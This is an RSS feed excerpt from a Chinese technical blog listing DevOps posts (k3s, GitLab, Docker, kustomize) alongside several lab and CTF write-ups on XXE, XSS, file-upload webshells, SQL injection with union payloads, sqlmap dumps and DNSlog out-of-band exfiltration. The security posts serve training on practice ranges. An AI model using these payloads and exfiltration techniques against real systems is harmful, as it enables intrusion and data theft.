客户端</title><link>https://tangx.in/posts/2021/06/17/dnsx/</link><pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/17/dnsx/</guid><description>dnsx - 一款支持多解析商的命令行 dnsx 客户端 多支持多运营商的 DNS 命令行 客户端。 Usage 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 DNSx 配置管理 DNS 解析 Usage: dnsx [command] Available Commands: add 添加域名解析 configure 管理配置文件 delete 删除解析记录 help Help about any command search 查询记录信息 switch 切换域名状态 Flags: -c, --config string config file (default &amp;#34;$HOME/.dnsx/dnsx.json&amp;#34;) -h, --help help for dnsx -p, --profile string profile (default &amp;#34;default&amp;#34;) Use &amp;#34;dnsx [command] --help&amp;#34; for more information about a command. dnsx profile configure dnsx</description></item><item><title>5分钟k3s - k3s 使用外部数据库实现高可用</title><link>https://tangx.in/posts/2021/06/16/k3s-cluster-ha/</link><pubDate>Wed, 16 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/16/k3s-cluster-ha/</guid><description>5分钟k3s - k3s 使用外部数据库实现高可用 hostname ipaddr master01 192.168.0.12 master01 192.168.0.45 agent01 192.168.0.111 1. 安装外置数据库 1 2 3 4 5 6 # 1. 安装一个外置数据库 # yum install mariadb mariadb-server ## ubuntu apt update apt install -y mysql-server 适配 mysql8.0 创建用户 1 2 3 4 5 6 7 8 -- mysql 8.0 创建解决办法: -- 创建账户:create user &amp;#39;用户名&amp;#39;@&amp;#39;访问主机&amp;#39; identified by &amp;#39;密</description></item><item><title>gitlab mergebot 合并机器人</title><link>https://tangx.in/posts/2021/06/16/gitlab-mergebot/</link><pubDate>Wed, 16 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/16/gitlab-mergebot/</guid><description>gitlab-mergebot gitlab merge request robot 是一个 golang 编写的 gitlab mr 请求处理扩展服务。 由于 gitlab(free plan) 的 Merge Request 功能有限， 不能支持多人 Code Reivew。 因此引入第三方机器人进行 MR 合法性仲裁。 设计思路 目标的安全: 使用 目标项目和分支 中的 .mergebot.yml 配置作为机器人判定配置 有意义的文字信息: 使用 Merge Request 的 Title 和 Description 作为合并后的的 commit message。 以约束 Merge Request 的</description></item><item><title>XXE 实体注入</title><link>https://tangx.in/posts/2021/06/12/xxe-demo/</link><pubDate>Sat, 12 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/12/xxe-demo/</guid><description>XXE 实体注入 好文推荐 https://xz.aliyun.com/t/3357#toc-0 https://cloud.tencent.com/developer/article/1690035 XXE 认识 XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子 1 2 3 4 5 6 &amp;lt;message&amp;gt; &amp;lt;receiver&amp;gt;Myself&amp;lt;/receiver&amp;gt; &amp;lt;sender&amp;gt;Someone&amp;lt;/sender&amp;gt; &amp;lt;header&amp;gt;TheReminder&amp;lt;/header&amp;gt; &amp;lt;msg&amp;gt;This is an amazing book&amp;lt;/msg&amp;gt; &amp;lt;/message&amp;gt; XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XM</description></item><item><title>5分钟k3s - k3s单节点架构介绍与安装卸载管理</title><link>https://tangx.in/posts/2021/06/07/k3s-architecture-single-server/</link><pubDate>Mon, 07 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/07/k3s-architecture-single-server/</guid><description>5分钟k3s - k3s单节点架构介绍与安装卸载管理 k3s 单 Server 节点架构 K3s 单节点集群的架构如下图所示，该集群有一个内嵌 SQLite 数据库的单节点 K3s server。 在这种配置中，每个 agent 节点都注册到同一个 server 节点。K3s 用户可以通过调用 server 节点上的 K3s API 来操作 Kubernetes 资源。 单节点k3s server的架构 Server 安装 安装条件</description></item><item><title>5分钟k3s-什么是 K3s? K3s 简介与适用场景介绍</title><link>https://tangx.in/posts/2021/06/05/k3s-introduce/</link><pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/05/k3s-introduce/</guid><description>什么是 K3s? K3s 是一个轻量级的 Kubernetes 发行版，它针对边缘计算、物联网等场景进行了高度优化。 K3s 有以下增强功能： 打包为单个二进制文件。 使用基于 sqlite3 的轻量级存储后端作为默认存储机制。同时支持使用 etcd3、MySQL 和 + PostgreSQL 作为存储机制。 封装在简单的启动程序中，通过该启动程序处理很多复杂的 TLS 和选项。 默</description></item><item><title>使用js读取html meta 实现静态前端网站容器化</title><link>https://tangx.in/posts/2021/05/22/frontend-webapp-dockerize-final/</link><pubDate>Sat, 22 May 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/05/22/frontend-webapp-dockerize-final/</guid><description>使用js读取html meta 实现静态前端网站容器化 之前写过一篇关于前端容器化的文章， 静态前端网站容器化 。 现在看来， 那个方案的可操作性并不高， 而且很弱智。 其中实现是需要使用 sed 替换 所有文件 中的占位符。 然后， js 本身是可以通过 html meta 传递信息的。 以下， 则是 通过 js 获取 html meta 信息以实现前端容器化 1. 重新整</description></item><item><title>gitlab-ci 配置复用 - reference tags</title><link>https://tangx.in/posts/2021/03/12/gitlab-ci-reference-tags/</link><pubDate>Fri, 12 Mar 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/03/12/gitlab-ci-reference-tags/</guid><description>gitlab-ci 配置复用 - reference tags 在 GitLab 13.9 中增加了一个新的关键字 !reference。 这个关键字可以在任意位置复用已存在的配置。 1 2 3 4 # tree ci/setup.yml .gitlab-ci.yml ci/setup.yml 1 2 3 4 5 6 # 以 . 开头的 job 名称为 隐藏job ， 将在 ci 中将被忽略 # https://docs.gitlab.com/ee/ci/yaml/README.html#hide-jobs .setup: image: hub-dev.rockontrol.com/docker.io/library/alpine:3.12 script: - echo creating environment .gitlab.ci.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36</description></item><item><title>lego-certmgr 使用 lego 生成证书的 web 服务</title><link>https://tangx.in/posts/2021/02/09/lego-certmgr-usage/</link><pubDate>Tue, 09 Feb 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/02/09/lego-certmgr-usage/</guid><description>lego-certmgr 一款使用 lego 生成域名证书的代理服务 lego-certmgr 是一个基于 lego - Github Libiray 封装的证书申请 代理 。 其目的是 为了快速方便的申请 Let&amp;rsquo;s Encrypt 证书 提供 RESTful API 接口， 方便下游系统 (ex cmdb) 调用并进行资源管理 因此 certmgr 为了方便快速返回已生成过的证书而缓存了一份结果。 由于 certmgr 定位是 代理 ， 所以并未考虑证书的 持久化 和 过期重建 操作。 使用说明 下载</description></item><item><title>静态前端网站容器化</title><link>https://tangx.in/posts/2021/01/28/frontend-webapp-dockerize/</link><pubDate>Thu, 28 Jan 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/01/28/frontend-webapp-dockerize/</guid><description>静态前端网站容器化 在容器启动的时候，将环境信息初始化到静态文件中，实现无状态镜像。 现实与需求 js 代码需要先从服务器下载到客户本地浏览器运行， 再与后端的服务器进行交付提供服务。 使用 nodejs 书写的网站， 通过 编译 产生静态文件， 放在 WEB容器 (例如 nginx/caddy ) 中即可对外提供服务。 容器本身需要无状态， 实现</description></item><item><title>CronJob 和 Job 的 退出 POD 数量管理</title><link>https://tangx.in/posts/2021/01/22/exited-pod-limits/</link><pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/01/22/exited-pod-limits/</guid><description>CronJob 和 Job 的 Pod 退出保留时间 cronjob 可以认为 CronJob 作为定时调度器， 在正确的时间创建 Job Pod 完成任务。 在 CronJob 中， 默认 .spec.successfulJobsHistoryLimit: 保留 3 个正常退出的 Job .spec.failedJobsHistoryLimit: 1 个异常退出的 Job 1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: batch/v1beta1 kind: CronJob metadata: name: zeus-cron-checkqueue namespace: zeus-dev spec: schedule: &amp;#34;*/10 * * * *&amp;#34; failedJobsHistoryLimit: 1 successfulJobsHistoryLimit: 3 jobTemplate: spec: template: # ... 略 https://github.com/kubernetes/kubernetes/issues/64056 job 除了 cronjob 管理 job 之外， job 本身也提供 .spec.ttlSecondsAfterFinished 进行退出管理。 默认情况下 如果 ttlSecondsAfterFinished 值未</description></item><item><title>存储型 XSS 利用</title><link>https://tangx.in/posts/2020/12/25/xss-with-store/</link><pubDate>Fri, 25 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/25/xss-with-store/</guid><description>存储型XSS 0x00 写在前面 任何事情切忌脑壳铁， 多听、多看、多梳理才能快速构建自己的知识树 ， 因而提高自己的快速检索能力。 好文推荐 循序渐进理解：跨源跨域，再到 XSS 和 CSRF - 双猫 信息收集 fofa 进入 https://fofa.so 搜索网站地址 整理信息： 操作系统： windows Web容器： apache/2.4.23/(win32) 开发语言版本: php/5.4.45 cms 查询 开发调试工具 cms 指纹工具 这里说一下</description></item><item><title>upload-labs上传漏洞利用笔记</title><link>https://tangx.in/posts/2020/12/23/upload-labs/</link><pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/23/upload-labs/</guid><description>文件上传漏洞 http://59.63.200.79:8016/Pass-01/index.php 配置 burpsuite， 开启response 拦截 pass-01 前端验证绕过 核心思想： 拦截 response ， 删除前端功能模块。 拦截 response。 删除 96 行以后的 js 模块， 并放行。 获取图片地址， 使用 蚁剑 连接 1 2 3 http://59.63.200.79:8016/Pass-01/upload/webshell.php # flag_kezZYqSU.txt : zkaq{PpsG@-cImaU2cahL} pass-02 Content-Type方式绕过 上传，拦截，抓包，修改 content-type: text/php 为 content-type: image/jpeg 1 2 3 http://59.63.200.79:8016/Pass-02/upload/webshell.php</description></item><item><title>MSSQL 反弹注入 堆叠注入 与 MSSQL速查</title><link>https://tangx.in/posts/2020/12/18/sql-inject-with-mssql-by-oob-stacked-inject/</link><pubDate>Fri, 18 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/18/sql-inject-with-mssql-by-oob-stacked-inject/</guid><description>MSSQL 反弹注入 堆叠注入 与 MSSQL速查 https://hack.zkaq.cn/battle/target?id=7dd07600c96f5d55 蠢到爆了 数据库自带库，表信息也可以使用 反弹 方式获取 数据库自带库，表信息也可以使用 反弹 方式获取 数据库自带库，表信息也可以使用 反弹 方式获取 数据库自带库，表信息也可以使用 反弹 方式获取 数据库自带库，表信息也可以使用 反弹 方式获取 数据库自带库，表信息也可以</description></item><item><title>反射性 XSS</title><link>https://tangx.in/posts/2020/12/18/xss-relection/</link><pubDate>Fri, 18 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/18/xss-relection/</guid><description>反射性 XSS 利用方式 Js的标识：弹窗：alert(1) 标签风格：&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; 伪协议触发：&amp;lt;a href=javascript:alert(1)&amp;gt;1&amp;lt;/a&amp;gt; (伪协议:) http:// ftp:// 小众协议：php:// 事件方法：&amp;lt;img src=1 onerror=alert(1) /&amp;gt; (触发器：事件) 在标签里面on开头的东西很高概率是事件</description></item><item><title>SQL注入 - DNSLOG注入 与 WAF绕过</title><link>https://tangx.in/posts/2020/12/17/sql-inject-by-oob-dnslog-and-bypass-waf/</link><pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/17/sql-inject-by-oob-dnslog-and-bypass-waf/</guid><description>SQL注入 - DNSLOG注入 与 WAF绕过 https://hack.zkaq.cn/battle/target?id=9b8ee696eb01591e 0x00 为什么经常说 完全和运维工作要左移（参考 CI/CD 流程） ？ 不管说什么， 商业的本质是赚钱， 阻挡赚钱的一切都是异端。 在任何时候 信息收集 都很重要。 分析的对象是 信息 ， 被利用对象的本质是 疏漏 。 信息分析可以找出这些疏漏 文件解析漏洞: 任意文件被指定解释器调用。</description></item><item><title>SQL注入-偏移注入</title><link>https://tangx.in/posts/2020/12/17/sql-inject-by-pianyi/</link><pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/17/sql-inject-by-pianyi/</guid><description>偏移注入 cookie 注入是类似于 POST 或者 GET 传参方式的一种。在 post 或 get 传入参数被反制的时候，可以尝试使用 cookie 注入。 常见的修改 cookie 值的方式有以下几种 浏览器，开发者工具 ，console 控制台。 documents.cookie=&amp;quot;id=171&amp;quot; documents.cookie=&amp;quot;id=&amp;quot;+escape(&amp;quot;171 order by 11&amp;quot;) 。 其中 escape 为 js 函数， 作用是进行 url 编码。 浏览器插件 burpsuite 抓包修改 access 数据库 access 本身没有库的概念， 更像是 表的集合 access 本</description></item><item><title>SQL注入之 宽字节注入</title><link>https://tangx.in/posts/2020/12/15/sql-inject-by-wildchar/</link><pubDate>Tue, 15 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/15/sql-inject-by-wildchar/</guid><description>SQL注入之 宽字节注入 http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1 利用原理： 利用数据库 支持的 多字节 编码特性， 将 转义符号 的 编码 ** 与编码** 顺位组合， 使 转义符号 失去原有的意义， 从而达到逃脱的目的。 这里 多字节 不一定是 双字节 如 （GBK）。 在其他字符集环境下，可能是其他字节， 例如 UTF-8 的三字节 。 在最左侧闭合逃脱的时候，可以使用 宽字节 方</description></item><item><title>Head 注入 - X-Forwarded-For 注入 （XFF）</title><link>https://tangx.in/posts/2020/12/14/sql-inject-with-head-x-forwarded-for/</link><pubDate>Mon, 14 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/14/sql-inject-with-head-x-forwarded-for/</guid><description>Head 注入 - X-Forwarded-For 注入 （XFF） 注意 burpsuite http 文件有自己的格式， HEAD 信息之间 不能有 空格。 X-Forwarded-For 单词不要写错。 X-Forwarded-For 在直接请求时，burpsuite 抓包中没有。 因此需要手工传入。 在每一步都需要仔细认真，切忌焦躁、贪多 ，事情往往就在最后一步事情平常心而导致失败。 使用 burpsuite 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 POST /Pass-09/index.php HTTP/1.1 Host:</description></item><item><title>SQL注入之 head 注入与引号绕过</title><link>https://tangx.in/posts/2020/12/12/sql-inject-by-head-and-quote-bypass/</link><pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/12/sql-inject-by-head-and-quote-bypass/</guid><description>SQL注入之 head 注入与引号绕过 http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_codea 0x00 先说结论 使用 -- gg 比 --+ 更通用，GET 中 + 会转为 空格 但 POST 中不会 其他而言, HEAD 注入与参数注入利用方式差别不大。 目前看来 INSERT 最难利用的是在判断 字段 插入位置和值对应类型 。 使用 updatexml() 函数报错 xpath 由于 0x7e 是 ~ ，不属于xpath语法格式， 因此报出xpath语法错误。 0x01 分析代码</description></item><item><title>golang 为 struct 自动添加 tags</title><link>https://tangx.in/posts/2020/12/11/tips-auto-add-tags/</link><pubDate>Fri, 11 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/11/tips-auto-add-tags/</guid><description>golang 为 struct 自动添加 tags vscode 中的 go 0.12.0 版本新加入了一个 auto add tags 的功能。 setting.json 配置如下 1 2 3 4 5 6 &amp;#34;go.addTags&amp;#34;: { &amp;#34;tags&amp;#34;: &amp;#34;yaml,json&amp;#34;, &amp;#34;options&amp;#34;: &amp;#34;yaml=omitempty,yaml=options2,yaml=options3,json=omitempty&amp;#34;, &amp;#34;promptForTags&amp;#34;: false, &amp;#34;transform&amp;#34;: &amp;#34;snakecase&amp;#34; }, 在 example.go 中创建一个 struct 1 2 3 4 5 type Person struct { Name string Age int Gender string } 将光标移动到 struct 结构体中， 使用 command + shift + p 选择 go: add tag for struct 即可 result 1 2 3 4 5 type Person struct { Name string `yaml:&amp;#34;name,omitempty,options2,options3&amp;#34; json:&amp;#34;name,omitempty&amp;#34;` Age int `yaml:&amp;#34;age,omitempty,options2,options3&amp;#34; json:&amp;#34;age,omitempty&amp;#34;` Gender string `yaml:&amp;#34;gender,omitempty,options2,options3&amp;#34; json:&amp;#34;gender,omitempty&amp;#34;` }</description></item><item><title>掌控安全 SQL 注入靶场练习 - Dnslog 带外测试</title><link>https://tangx.in/posts/2020/12/10/zkaq-sql-inject-by-dnslog/</link><pubDate>Thu, 10 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/10/zkaq-sql-inject-by-dnslog/</guid><description>掌控安全 SQL 注入靶场练习 - Dnslog 带外测试 dnslog 带外实现 依赖 UNC ， 因此只能在 Windows 下利用 利用 DNS 记录不存在时向上查询的工作模式实现带外攻击 不支持 load_file('http://host:port/1.txt') 模式， 否则用不着 dns 了。 OOB 带外中心思想 将本地数据 select ... 通过触发器 load_file( ... ) 将结果传递到外部（含文件）xx.dnslog.cn 0x00 先说结论 0x00.1 dnslog 结果只会缓存 10 个， 超过 10</description></item><item><title>查询 MYSQL 数据库 系统库名、表名、字段名 SQL语句</title><link>https://tangx.in/posts/2020/12/09/select-dbms-schema-table-column-names/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/09/select-dbms-schema-table-column-names/</guid><description>查询 MYSQL 数据库 系统库名、表名、字段名 SQL语句 注意: 由于 引号 的原因， 盲注时字符探测不能使用 字符 。 而应该使用 ASCII 进行转换。 0x01 数据库探测 0x01.1 数据库数量探测 1 2 3 -- 数据库数量探测 http://vulhub.example.com:81/Pass-10/index.php?id=1 AND (SELECT COUNT(*) FROM information_schema.SCHEMATA)=6 0x01.2 当前数据库名称探测 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 -- 查询当前数据库有多少张表 SELECT COUNT(*) FROM information_schema.`TABLES` WHERE TABLE_SCHEMA=database(); --</description></item><item><title>掌控安全 SQL 注入靶场练习 - 时间盲注</title><link>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-timebased-blind/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-timebased-blind/</guid><description>掌控安全 SQL 注入靶场练习 - 时间盲注 SQL 时间盲注 0x01 使用 SQLMAP 工具 0x01.1 dump database 1 ./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 --current-db 执行结果 current database: &amp;#39;kanwolongxia&amp;#39; 0x01.2 dump tables 1 ./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia --tables 执行结果 Database: kanwolongxia [3 tables] +--------+ | user | | loflag | | news | +--------+ 3 tables: user, loflag, news 0x01.3 dump columns 1 ./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag --columns 执行结果 Database: kanwolongxia Table: loflag [2 columns] +--------+--------------+ | Column | Type | +--------+--------------+ | flaglo | varchar(255) | | Id | int(11) | +--------+--------------+ 0x01.4 dump values 1 ./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag -C flaglo --dump 执行结果 Database: kanwolongxia Table: loflag [5 entries]</description></item><item><title>掌控安全 SQL 注入靶场练习 - 引号括号错误注入</title><link>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-error-quote-and-bracket/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-error-quote-and-bracket/</guid><description>掌控安全 SQL 注入靶场练习 - 引号括号错误注入 根据之前的经验，已经猜测出过关 Flag 的值了。 接下来两关是 引号 与 括号 的组合。 0x01 括号单引号 注意闭合 单引号 和 括号 1 2 3 4 --- 1. 注意闭合 单引号 和 括号 http://vulhub.example.com:81/Pass-03/index.php?id=1&amp;#39;) and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1 --- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K 0x02 括号双引号 注意闭合 单引号 和 括号 1 2 3 4 --- 1. 注意闭合 双引号 和 括号 http://vulhub.example.com:81/Pass-04/index.php?id=1&amp;#34;) and 1=2 union select 1,2,(select group_concat(flag)</description></item><item><title>掌控安全 SQL 注入靶场练习 Pass1 - 报错注入</title><link>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-error/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-error/</guid><description>掌控安全 SQL 注入靶场练习 Pass1 - 报错注入 靶场地址: http://vulhub.example.com:81/Pass-01/index.php?id=1 注意: 错误注入 不一定是会返回错误信息。 也指不正常显示结果， 例如此题的查询为空。 0x01 准备工具 辅助工具 google extension : hackbar 帮助快速构造语句 显示原始字符，免去 urlcode 烦恼 0x02 开始 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 -- 1. 查询数据库名 http://vulhub.example.com:81/Pass-01/index.php?id=1 and 1=2 union select 1,2, database() --</description></item><item><title>掌控安全 SQL 注入靶场练习Pass2 - 单引号报错注入</title><link>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-error-single-quote/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/09/zkaq-sql-inject-by-error-single-quote/</guid><description>掌控安全 SQL 注入靶场练习Pass2 - 单引号报错注入 课程目标 https://hack.zkaq.cn/battle/target?id=695d4b6fe02d0bf3 注意, 误区 : 一定 不要认为 所有错误都会被反映到页面上， 程序会处理错误逻辑，并隐藏。 0x01. 判断注入点 引号探测 使用 http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=1 --+。 可以正常显示结果， 但 1=2 --+ 不行。 判断为 单引号 闭合。 错误姿势 1 2 -- 1. 语句错误, 测试了 `select 1 到 7`。 都没发现可以</description></item><item><title>5 分钟Gitlab - 安装 Gitlab</title><link>https://tangx.in/posts/2020/12/07/install-gitlab/</link><pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/07/install-gitlab/</guid><description>5 分钟Gitlab - 安装 Gitlab Gitlab 是巴啦啦啦啦一大堆。 好处很多。 选型 即使不准备付费， 也选 GitlabEE（企业版本）。 ee 版本免费授权 ee 版本默认开放 ce （社区版） 所有功能。 启用高级功能只需付费购买授权即可。 https://about.gitlab.com/install/ce-or-ee/?distro=ubuntu 准备 准备一台虚拟机， 假设为 ubuntu20.04 操作系统。 根据需要，挂载多个数据盘 默认 /var/opt/gitlab (建议独立) 数</description></item><item><title>k8s 部署工具 kustomize 的实用小技巧</title><link>https://tangx.in/posts/2020/12/05/kusutomize-usage-tips/</link><pubDate>Sat, 05 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/05/kusutomize-usage-tips/</guid><description>k8s 部署工具 kustomize 的实用小技巧 在 k8s 上的部署， 大多组件都默认提供 helm 方式。 在实际使用中， 常常需要针对不通环境进行差异化配置。 个人觉得， 使用 kustomize 替换在使用和管理上，比直接使用 helm 参数更为清晰 。 同时组件在一个大版本下的部署方式通常不会有太大的变化， 没有必要重新维护一套部署文档，其实也不一定有精力这</description></item><item><title>学习 shell 反弹实现， 优化 Docker 基础镜像安全</title><link>https://tangx.in/posts/2020/12/03/shell-reflect2/</link><pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/03/shell-reflect2/</guid><description>学习 shell 反弹实现， 优化 Docker 基础镜像安全 天天都在说优化 Dockerfile。 到底怎么优化， 优化后的检验指标又是什么？ 没有考虑清楚行动目的， 隔空放炮， 必然徒劳无功。 笔者最近准备在 CI 上增加安全检测， 在分析案例样本的时候， 找到了比较流行的 struts2 漏洞， 其中 S2-052 远程代码执行漏洞 的利用方式就是在 POST 请求中</description></item><item><title>使用 sqlmap 根据变量位置定点注入 restful api</title><link>https://tangx.in/posts/2020/12/02/sqlmap-injection-restful/</link><pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/12/02/sqlmap-injection-restful/</guid><description>使用 sqlmap 根据变量位置定点注入 restful api sqlmap 是一款强劲自动化的 sql 注入工具， 使用 python 开发， 支持 python 2/3。 RESTful API 规则几乎是当前开发执行的默认规范。 在 restful 接口中， 常常将变量位置放置在 url 中。 例如 http://127.0.0.1:8080/{user}/profile ， 其中 {user} 就是变量，根据代码实现方式，可以等价于 http://127.0.0.1:8080/profile?user={user} 。 那么， 在对这类 restful 接口进行 sql 注入的时候，又该注意什么呢？ 本文将</description></item><item><title>minio 使用 lego 实现 https</title><link>https://tangx.in/posts/2020/11/13/minio-with-lego/</link><pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/11/13/minio-with-lego/</guid><description>minio 使用 lego 实现 https 访问 minio 提供两种 https 访问。 推荐 在启动过程中使用 certs 证书。 此种方法最后只提供 https 访问。 使用 https 代理。 nginx proxy caddy proxy 1 2 3 4 5 6 7 8 9 10 $ tree . -L 3 . ├── certs │ ├── CAs │ ├── private.key │ └── public.crt ├── data ├── entrypoint.sh ├── minio 1 2 3 4 5 6 7 8 9 #!/bin/bash # entrypoint.sh cd $(dirname $0) DIR=$(pwd) export MINIO_ACCESS_KEY=minio export MINIO_SECRET_KEY=miniostorage ./minio --certs-dir ${DIR}/certs server ${DIR}/data troubleshoot the ECDSA curve &amp;lsquo;P-384&amp;rsquo; is not supported ERROR Unable to load the</description></item><item><title>使用 s3cmd 为 cephfs 设置 policy</title><link>https://tangx.in/posts/2020/11/12/s3cmd-policy-for-cephfs/</link><pubDate>Thu, 12 Nov 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/11/12/s3cmd-policy-for-cephfs/</guid><description>使用 s3cmd 为 cephfs rgw 设置 policy cephfs rgw 模式完全兼容 aws 的 s3v4 协议。 因此对 cephfs rgw 的日常管理， 可以使用 s3cmd 命令操作。 策略 配置策略 全局读策略 1 2 3 4 5 6 7 8 9 10 # cat public-read-policy.json { &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, &amp;#34;Statement&amp;#34;: [{ &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, &amp;#34;Principal&amp;#34;: &amp;#34;*&amp;#34;, &amp;#34;Action&amp;#34;: &amp;#34;s3:GetObject&amp;#34;, &amp;#34;Resource&amp;#34;: &amp;#34;*&amp;#34; }] } 设置策略 1 $ s3cmd setpolicy public-read-policy.json s3://example-bucket 查看 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ s3cmd info s3://example-bucket s3://example-bucket/ (bucket): Location: default Payer: BucketOwner Expiration Rule: none policy: { &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, &amp;#34;Statement&amp;#34;: [{ &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, &amp;#34;Principal&amp;#34;: &amp;#34;*&amp;#34;, &amp;#34;Action&amp;#34;: &amp;#34;s3:GetObject&amp;#34;, &amp;#34;Resource&amp;#34;: &amp;#34;*&amp;#34;</description></item><item><title>使用 docker buildx 实现多平台编译 - 案例篇</title><link>https://tangx.in/posts/2020/11/07/docker-buildx-examples/</link><pubDate>Sat, 07 Nov 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/11/07/docker-buildx-examples/</guid><description>使用 docker buildx 实现多平台编译 - 案例篇 之前的文章中 使用 docker buildx 实现多平台编译 - 环境篇 介绍了如何部署 docker buildx 环境。 笔者本文将要分享自身在使用中的几个比较有意义的案例 0x00 先说结论 docker buildx 本身运行于容器环境， 所以 scheduler 和 builder 本机配置（ex, /etc/hosts, /etc/docker/daemon.json ） 的大部分配置和场景 其实是不可用的。 使用 ssh://user@host 可以方便的执行远程构建， 尤其</description></item><item><title>Dockerfile 中 ARG 的使用与其的作用域探究</title><link>https://tangx.in/posts/2020/11/06/dockerfiles-args-scope/</link><pubDate>Fri, 06 Nov 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/11/06/dockerfiles-args-scope/</guid><description>Dockerfile 中 ARG 的使用与其的作用域探究 使用 ARG 可以有效的复用 Dockerfile。 每次镜像更新，只需要动态的在 build 命令中传入新的参数值即可。 0x01 结论 在第一个 FROM 之前的所有 ARG , 在所有 FROM 中生效, 仅在 FROM 中生效 在 FROM 后的 ARG, 仅在当前 FROM 作用域生效。 即尽在当前 阶段 (stage) 生效 对照组解析 在随后的 Dockerfile 中, 只定义了一个变量 image ,</description></item><item><title>tidb 备份恢复与迁移</title><link>https://tangx.in/posts/2020/10/10/tidb-migrate/</link><pubDate>Sat, 10 Oct 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/10/10/tidb-migrate/</guid><description>tidb 备份恢复与迁移 https://pingcap.com/docs-cn/v2.1/reference/tools/download/ 1 wget https://download.pingcap.org/tidb-enterprise-tools-latest-linux-amd64.tar.gz 使用 mydumper 从 mysql/tidb 备份数据 https://pingcap.com/docs-cn/v2.1/how-to/maintain/backup-and-restore/ 使用 mydumper 备份 mydumper: https://github.com/maxbube/mydumper/releases 1 mydumper -h 127.0.0.1 -P 4000 -u root -t 32 -F 64 -B test -T t1,t2 --skip-tz-utc -o ./var/test 我们使用 -B test 表明是对 test 这个 database 操作，然后用 -T t1,t2 表明只导出 t1，t2 两张表。 -t 32 表明使用 32 